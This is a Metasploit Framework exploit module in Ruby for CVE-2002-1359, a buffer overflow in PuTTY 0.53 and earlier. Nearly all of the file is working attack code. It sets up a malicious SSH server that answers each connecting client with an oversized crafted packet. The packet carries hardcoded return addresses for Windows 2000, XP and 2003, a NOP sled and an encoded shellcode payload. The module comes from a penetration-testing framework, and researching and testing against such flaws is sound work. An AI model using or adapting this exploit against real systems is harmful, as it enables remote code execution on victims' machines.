##
# $Id: putty_msg_debug.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PuTTy.exe <= v0.53 Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the PuTTY SSH client that is triggered
				through a validation error in SSH.c.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2002-1359' ],
					[ 'OSVDB', '8044'],
					[ 'URL', 'http://www.rapid7.com/advisories/R7-0009.html' ],
					[ 'BID', '6407'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00",
					'MaxNops'  => 0,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29 } ],
					[ 'Windows XP SP2 English',   { 'Ret' => 0x76b43ae0 } ],
					[ 'Windows 2003 SP1 English', { 'Ret' => 0x76aa679b } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 16 2002',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The SSH daemon port to listen on", 22 ])
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		buffer =
			"SSH-2.0-OpenSSH_3.6.1p2\r\n" +
			"\x00\x00\x4e\xec\x01\x14" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde" +
			(((((rand_text_alphanumeric(64)) + ",") * 30) + rand_text_alphanumeric(64) + "\x00\x00\x07\xde") * 2) +
			(((rand_text_alphanumeric(64)) + ",") * 2) + rand_text_alphanumeric(21) +
			[target.ret].pack('V') + make_nops(10) + p.encoded +
			(((rand_text_alphanumeric(64)) + ",") * 15) + rand_text_alphanumeric(64) + "\x00\x00\x07\xde" +
			(((rand_text_alphanumeric(64)) + ",") * 30) + rand_text_alphanumeric(64) + "\x00\x00\x07\xde" +
			(((rand_text_alphanumeric(64)) + ",") * 21) + rand_text_alphanumeric(64) + "\x00\x00\x07\xde" +
			(((((rand_text_alphanumeric(64)) + ",") * 30) + rand_text_alphanumeric(64) + "\x00\x00\x07\xde") * 6) +
			"\x00\x00\x00\x00\x00\x00"

		print_status("Sending #{buffer.length} bytes to #{client.getpeername}:#{client.peerport}...")

		client.put(buffer)
		handler

		service.close_client(client)
	end

end